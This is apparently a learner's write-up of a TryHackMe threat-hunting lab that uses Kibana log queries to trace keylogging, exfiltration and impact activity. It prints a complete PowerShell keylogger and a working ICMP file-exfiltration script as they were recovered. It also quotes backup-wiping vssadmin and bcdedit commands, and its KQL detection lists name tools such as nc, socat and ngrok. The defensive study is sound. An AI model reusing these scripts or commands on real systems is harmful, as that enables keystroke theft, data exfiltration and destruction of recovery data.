# TryHackMe: Threat Hunting: Endgame Summary

Room Link: 

[Threat Hunting: Endgame](https://tryhackme.com/room/threathuntingendgame)

## **Threat Hunting for "Actions on Objectives"**

### **1. Threat Hunting & MITRE ATT&CK**

- **Proactive approach** to detect malicious activity before major damage occurs.
- **MITRE ATT&CK** provides a framework to map adversary tactics (e.g., exfiltration, data destruction).
- Hunting involves **hypothesis-driven investigations** based on known threats.

### **2. "Actions on Objectives" (Final Phase of Cyber Kill Chain)**

- Adversaries **execute their end goals**:
    - Data theft (exfiltration).
    - Data destruction/encryption (ransomware).
    - Credential theft.
- **Assumes attackers already bypassed defenses**—focus is on **detection & response**.

### **3. Proactive Threat Hunting Mindset**

- **Goal**: Reduce **dwell time** (avg. ~20-25 days in 2023).
- **Key Practices**:
    - **Hypothesis-driven searches** (e.g., suspicious commands like **`vssadmin`**).
    - **Continuous monitoring & threat intelligence**.
    - **Analytics & iterative improvement**.

### **4. Atomic Hints for Effective Hunting**

- **Tailor hunting** to industry, threat landscape, and regulations.
- **Leverage frameworks** (MITRE ATT&CK) but adapt based on complexity.
- **Collaborate** with teams for better detection.

### **Key Takeaways**

- Hunt **early** to minimize damage.
- Focus on **post-breach activity** (data theft/destruction).
- Use **MITRE ATT&CK** to guide investigations.
- **Reduce dwell time** with proactive monitoring.

## Tactic: Collection

### [The **Collection** tactic (TA0009)](https://attack.mitre.org/tactics/TA0009/)

involves techniques adversaries use to gather valuable data from a target system, which may include:

- Exploitation/pivoting data (credentials, network info)
- Intelligence (internal documents, emails)
- Monetizable data (financial records, PII, intellectual property)

**Common Techniques**

1. **Man-in-the-Middle (MITM) Attacks**
    - ARP/LLMNR Poisoning
    - SMB Relay
    - DHCP Spoofing
2. **Hijacking & Traffic Interception**
    - Session hijacking
    - Network traffic dumps
3. **Input Capture**
    - Keylogging (API-based, hooks)
    - Clipboard theft
4. **Data Harvesting**
    - Local files, cloud storage, repositories

**Link to Other MITRE ATT&CK Tactics**

- **Initial Access** (TA0001) – Stolen credentials used for entry
- **Lateral Movement** (TA0008) – Collected data helps pivot
- **Exfiltration** (TA0010) – Data prepared for theft
- **Impact** (TA0040) – Sensitive data deletion/leakage

**Detection & Best Practices**

**Inventory & Monitor Sensitive Data**

- Track access to critical files (DLP solutions)
- Log user/account activities for anomalies

**Endpoint & Network Security**

- Monitor API calls (e.g., **`GetAsyncKeyState`**, **`SetWindowsHookEx`**)
- Detect unusual process injections

**Behavioral Analysis (UBA)**

- Look for unusual data access patterns
- Hunt for keyloggers (common APIs: **`GetKeyState`**, **`WH_KEYBOARD_LL`**)

---

### **Case Example: Hunting Keyloggers**

**Keylogger Types**

- **API-Based** (**`GetKeyboardState`**, **`SetWindowsHook`**)
- **Low-Level Hooks** (**`WH_KEYBOARD_LL`**, **`WH_MOUSE_LL`**)

**Detection Approach**

1. **Analyze Suspicious API Calls**
    - Unusual **`SetWindowsHookEx`** usage
    - Repeated **`GetAsyncKeyState`** checks
2. **Monitor Process Behavior**
    - Unexpected DLL injections
    - High-volume keystroke logging

**Proactive Measures**

- **Block known keylogging APIs** via EDR
- **Audit hook installations** in Windows

**Case Index =** `case_collection`

**Filtering fields to investigate specific log types:**

- `winlog.channel`
- `winlog.provider_name`

**Objective:** Detect keylogging activity by searching for **suspicious API calls** in process execution logs. **Key API Patterns**

The query searches for these high-risk functions:

- **`GetKeyboardState`**, **`SetWindowsHook`**, **`GetKeyState`**
- **`GetAsyncKeyState`**, **`VirtualKey`**, **`vKey`**
- **`filesCreated`**, **`DrawText`**

**Method**

1. **KQL Query** (for log analysis):
    
    ```sql
    *GetKeyboardState* or *SetWindowsHook* or *GetKeyState* or *GetAsynKeyState* or *VirtualKey* or *vKey* or *filesCreated* or *DrawText*
    ```
    
2. **Scope**:
    - Process execution logs
    - Pattern matches in command lines, DLL loads, or PowerShell scripts

**Expected Findings**

- Malicious processes calling keylogging APIs
- Unusual hook installations (**`SetWindowsHook`**)
- Unexpected keystroke capture attempts (**`GetAsyncKeyState`**)

<img width="1919" height="794" alt="Screenshot 2025-08-12 145736" src="https://github.com/user-attachments/assets/9ce5662a-517b-4537-9c4b-0c849fb6764e" />

we have two suspicious files: 

- ps1 script file
- db file

<img width="1894" height="827" alt="Screenshot 2025-08-12 150337" src="https://github.com/user-attachments/assets/8a3d639e-a3aa-4fc4-81a0-e04a42ec9a29" />

the `process.id: 3388`  downloaded a suspicious script file and saved it to the temp folder. This is the content of the malicious script

```powershell
function Start-KeyLogger($Path="$env:temp\chrome_local_profile.db") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    # open logger file in Notepad
    notepad $Path
  }
}
```

Following the spawned processes, we found notepad.exe was used to open the logger file DB named `chrome_local_profile.db` 

<img width="1915" height="549" alt="Screenshot 2025-08-12 154634" src="https://github.com/user-attachments/assets/e2bbdfad-873a-4251-8416-9f86cd425ed9" />

Follow the created file

<img width="1916" height="784" alt="Screenshot 2025-08-12 150939" src="https://github.com/user-attachments/assets/108e7880-1c7e-4f27-ba03-cb44782ddae8" />

The cat command is used to view the content of the database file. To follow the events after the cat command execution, click on the `View surrounding documents` then, click on the `Load 5 newer documents` .

The cat command execution happened at: `Sep 1, 2023 @ 12:21:31.646`

<img width="1906" height="758" alt="Screenshot 2025-08-12 151955" src="https://github.com/user-attachments/assets/2a42f4ec-10d7-48a2-8799-2349c586fe65" />

And this is the content of the DB file, the attacker used this file to log the victim's keylogging

<img width="1631" height="218" alt="Screenshot 2025-08-12 152317" src="https://github.com/user-attachments/assets/86ffc6af-3c78-4f2a-8d8f-b54f788ee8ef" />

## Tactic: Exfiltration

### **What is the Exfiltration Tactic?**

- Part of the MITRE ATT&CK framework ([**TA0010**](https://attack.mitre.org/tactics/TA0010/)).
- Focuses on **stealing or leaking data** from a compromised system.
- Often involves **compression, encryption, and covert channels** to avoid detection.

**Common Techniques Used**

- **Data Transfer Over C2 Channels**:
    - Exfiltration via **HTTP(S), DNS, ICMP, SMB, or SMTP**.
    - Use of **legitimate tools** (**`curl`**, **`certutil`**, **`ping`**, **`scp`**, **`Invoke-WebRequest`**).
- **Alternative Exfiltration Methods**:
    - **Cloud storage** (Google Drive, Dropbox).
    - **Bluetooth/USB devices**.
    - **ICMP tunneling** (covert data in ping packets).

**Why Is It Dangerous?**

- Leads to **data breaches, intellectual property theft, or espionage**.
- Often **blends in with normal traffic** (e.g., DNS exfiltration).
- Attackers may **stage data** before final exfiltration.

**Detection & Hunting Tips**

**Key Logs to Monitor**:

- **Process execution logs** (e.g., **`certutil`**, **`curl`**, **`ping`** with unusual arguments).
- **Network traffic anomalies** (unusual DNS queries, large ICMP packets).
- **Windows Event Logs** (**`winlog.channel`**, **`winlog.provider_name`**).

**Example KQL Query for Threat Hunting**:

```
*ping* OR *ipconfig* OR *arp* OR *route* OR *telnet* OR *tracert* OR *nslookup* OR *netstat* OR *netsh* OR *smb* OR *smtp* OR *scp* OR *ssh* OR *wget* OR *curl* OR *certutil* OR *nc* OR *ncat* OR *netcut* OR *socat* OR *dnscat* OR *ngrok* OR *psfile* OR *psping* OR *tcpvcon* OR *tftp* OR *socks* OR *Invoke-WebRequest* OR *server* OR *post* OR *ssl* OR *encod* OR *chunk*
```

(Helps detect suspicious command-line activity related to data transfer.)

**Best Practices for Defense**

✅ **Data Classification & Access Controls** (limit who can access sensitive data).

✅ **DLP (Data Loss Prevention) Solutions** (block unauthorized transfers).

✅ **Encrypt Sensitive Data** (renders stolen data useless without decryption keys).

✅ **Monitor Unusual Network Traffic** (e.g., large DNS requests, unexpected ICMP).

### **Case Example: ICMP Exfiltration**

- Attackers use **`ping` with encoded data** to bypass firewalls.
- Detection: Look for **unusually large or frequent ICMP packets**.
- **System-Level Clues**:
    - Unusual **`ping`** commands in process logs.
    - **`certutil -encode`** (encoding data before exfiltration).

```sql
*$ping* or *$ipconfig* or *$arp* or *$route* or *$telnet* or *$tracert* or *$nslookup* or *$netstat* or *$netsh* or *$smb* or *$smtp* or *$scp* or *$ssh* or *$wget* or *$curl* or *$certutil* or *$nc* or *$ncat* or *$netcut* or *$socat* or *$dnscat* or *$ngrok* or *$psfile* or *$psping* or *$tcpvcon* or *$tftp* or *$socks* or *$Invoke-WebRequest* or *$server* or *$post* or *$ssl* or *$encod* or *$chunk* or *$ssl*
```

<img width="1880" height="793" alt="Screenshot 2025-08-12 203806" src="https://github.com/user-attachments/assets/8d7bf683-a626-4843-9fd2-9286f6db4f98" />

This log shows a PowerShell command being executed to create a new Ping object.

**Command Executed**:

```powershell
$ping = New-Object System.Net.Networkinformation.ping
```

- Creates a new Ping object from the .NET framework and assigns it to the **`$ping`** variable
- This object can be used to send ICMP echo requests (ping) to network hosts

**Command Invocation Details**: Shows the **`New-Object`** cmdlet was called with the type name "System.Net.Networkinformation.ping".

**Script Location**: C:\Users\Administrator\AppData\Local\Temp\icmp4data.ps1

<img width="1909" height="795" alt="Screenshot 2025-08-12 205329" src="https://github.com/user-attachments/assets/9de10f6c-be30-4d01-956f-cbfa5d1da1bc" />

If we follow the surrounding documents of the suspicious script, we will find: 

<img width="1907" height="837" alt="Screenshot 2025-08-12 205757" src="https://github.com/user-attachments/assets/0bf16698-0dc7-46ee-9193-f7f27cecf16d" />
<img width="1852" height="741" alt="Screenshot 2025-08-12 211322" src="https://github.com/user-attachments/assets/0d93d8b3-165b-4eb5-a325-9cd3465aaed9" />

This is the content of the malicious script → **icmp4data.ps1**

```powershell
param (
    [string]$fl = "file",
    [string]$ip = "ip"
)
$ping = New-Object System.Net.Networkinformation.ping
$readChunkSize = 15
foreach ($Data in Get-Content -Path $fl -Encoding Byte -ReadCount $readChunkSize) {
    $ping.Send($ip, $readChunkSize, $Data)
}
```

This script is a **covert data exfiltration tool** that uses ICMP (ping) packets to secretly send file contents to a remote server.

- Reads a specified file (**`$fl`**) in **binary mode** (15 bytes at a time)
- Each 15-byte chunk is embedded in the **data portion of an ICMP Echo Request (ping) packet**
- Sent to the target IP address specified in **`$ip`**

Here is the execution of the script; the attacker exfiltrates the DB file we discovered in the collection phase, which contained the victim’s keylogging, to a remote server

<img width="1102" height="152" alt="Screenshot 2025-08-12 211245" src="https://github.com/user-attachments/assets/808b1d55-7777-4ee6-baa7-9c49371e5fbf" />

The total number of sent ICMP packets is 21 

<img width="1910" height="814" alt="Screenshot 2025-08-12 213131" src="https://github.com/user-attachments/assets/448213c6-6b0f-419e-8edc-11f8896393c6" />

## Tactic: Impact

### **What is the Impact Tactic?**

- Part of the MITRE ATT&CK framework ([**TA0040**](https://attack.mitre.org/tactics/TA0040/)).
- Focuses on **disrupting availability, functionality, or data integrity**.
- Includes **ransomware, data destruction, manipulation, defacement, and service disruption**.

**Common Techniques Used**

- **System/Service Disruption**: Modifying critical settings (**`bcdedit`**, **`vssadmin`**).
- **Data Manipulation/Destruction**: Deleting backups (**`vssadmin delete shadows`**), encrypting files.
- **Recovery Prevention**: Disabling recovery tools (**`recoveryenabled no`**).

**Why Is It Dangerous?**

- **Silent but devastating** (e.g., Olympic Destroyer APT group manipulated backups silently).
- Often uses **native tools** (**`del`**, **`rm`**, **`vssadmin`**, **`wbadmin`**) to evade detection.
- Can lead to **permanent data loss** or **unrecoverable system states**.

**Detection & Hunting Tips**

**Key Logs to Monitor**:

- **Process execution logs** (e.g., **`vssadmin`**, **`bcdedit`**, **`wevtutil`**).
- **Windows Event Logs** (**`winlog.channel`**, **`winlog.provider_name`**).

**Example KQL Query for Threat Hunting**:

```
*del* or *rm* or *vssadmin* or *wbadmin* or *bcdedit* or *wevutil* or *shadow* or *recovery* or *bootstatuspolicy*
```

(Helps detect suspicious command-line activity.)

### **Best Practices for Defense**

✅ **Regular threat hunting & risk assessments**.

✅ **Zero Trust & system hardening**.

✅ **Monitor native tool usage** (e.g., **`vssadmin`**, **`bcdedit`**).

✅ **Maintain backups & disaster recovery plans**.

### **Case Example: Olympic Destroyer APT**

- Used **`vssadmin delete shadows /all`** to **wipe backups**.
- Modified boot settings (**`bcdedit /set {default} recoveryenabled no`**) to **prevent recovery**.
- **Detection**: Look for unusual **`vssadmin`** or **`bcdedit`** executions in logs.

<img width="1892" height="806" alt="Screenshot 2025-08-12 223706" src="https://github.com/user-attachments/assets/0b2d56f4-ede6-4e06-9e4f-ec8c84ffe935" />

To narrow down the result, filter by log sources, starting with the **Security** log channel

<img width="1421" height="728" alt="Screenshot 2025-08-12 223538" src="https://github.com/user-attachments/assets/81477c7c-f091-4fa0-a7ee-e7d25b36aa73" />

<img width="1887" height="720" alt="Screenshot 2025-08-12 223757" src="https://github.com/user-attachments/assets/a140dedd-0112-4e4b-afe3-f9eb0781d536" />

Focus on the first suspicious event by filtering the event id

```sql
winlog.event_data.ProcessId : "1972"
```

<img width="1919" height="640" alt="Screenshot 2025-08-13 104831" src="https://github.com/user-attachments/assets/3793c699-65e0-45a5-a17a-220b7e2b6a57" />

**vssadmin.exe** was used to forcefully delete all **Volume Shadow Copies** (system restore points and backup snapshots) on the computer without prompting for confirmation, and the main shell image that started the attack chain is **Powershell.exe.**

## Timeline

| `Sep 1, 2023 @ 12:16:02.189` | `chrome-update_api.ps1` was downloaded and saved in the victim’s temp folder |
| `Sep 1, 2023 @ 12:19:14.091` | the attacker used notepad.exe to open a db file  |
| `Sep 1, 2023 @ 12:21:31.650` | The DB file logged the victim mail account |
| `Sep 3, 2023 @ 21:48:19.782` | The attacker used vssadmin.exe to delete all shadow copies and disable the recovery system mode |
| `Sep 3, 2023 @ 22:56:17.159` | The attacker exfilterate db file using this icmp protocol on 10.10.87.116  |

## Summary

| **Tactic** | **Hunting Methodology** |
| --- | --- |
| Collection | • Implement baselining and monitor file changes.
• Monitor network traffic data spikes and anomalies.
• Monitor driver installations.
• Monitor process and registry activities. |
| Exfiltration | • Monitor command executions.
• Monitor file access.
• Monitor network traffic data. |
| Impact | • Monitor command executions.
• Monitor file modification and deletion.
• Monitor snapshot, volume, drive and image load, access and deletion.
• Monitor AS API execution. |

The list below will help you create a proactive hunting ability and a more resilient attack surface.

- Learn your environment scope, components and expected activity patterns.
- Implement a continuous monitoring solution to improve visibility.
- Implement behavioural analysis and threat intelligence solutions.
- Plan and practice threat hunting, purple teaming and incident response drills.
